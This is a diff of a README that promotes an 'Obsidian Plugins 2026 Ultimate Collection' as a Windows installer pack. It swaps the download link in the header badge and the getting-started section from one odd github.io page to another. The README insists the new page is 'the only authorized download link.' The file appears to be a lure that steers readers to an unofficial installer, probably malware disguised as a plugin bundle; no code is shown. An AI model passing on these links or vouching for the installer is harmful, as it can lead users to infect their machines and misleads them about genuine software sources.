@@ -2,7 +2,7 @@
 
 Obsidian Plugins 2026 Ultimate Collection is a comprehensive resource designed to elevate your Obsidian experience with a wide array of community plugins, themes, and productivity tools. This pack is tailored for Windows 10 and 11 users, offering everything you need to optimize your note-taking, knowledge management, and workflow customization. Whether you're a student, professional, or enthusiast, this collection ensures you have access to the latest enhancements for your Obsidian vault.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ We aim to update the collection quarterly or as significant new plugins and them
 
 To get started with the Obsidian Plugins 2026 Ultimate Collection, download the installer from the official source:
 
-[Get the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 **Important**: This is the only authorized download link. Avoid third-party sources to prevent security risks and ensure you receive the genuine product.
 
